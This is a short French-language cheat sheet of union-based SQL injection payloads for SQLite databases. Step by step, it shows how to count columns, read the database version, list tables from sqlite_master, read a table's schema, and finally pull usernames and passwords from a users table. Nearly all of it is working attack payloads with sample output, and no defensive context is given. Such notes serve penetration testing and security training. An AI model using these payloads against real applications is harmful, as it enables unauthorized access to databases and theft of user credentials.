# SQLite

## Déterminer le nombre de colonnes

```
' union select 1-- -  # erreur
' union select 1, null-- - # pas d'erreur, il y a donc deux colonnes
```

## Retrouver la version de la base de données

```
' union select 1, sqlite_version()-- -
```

## Lister les tables

```
' union select 1, name from sqlite_master where type='table'-- - 
# Output : foo, users
```

## Retrouver le format des tables

```
' union select 1, sql from sqlite_master where tbl_name = 'users' and type = 'table'-- - 
# Output : CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
```

## Extraction

```
' union select username, password from users-- -
```
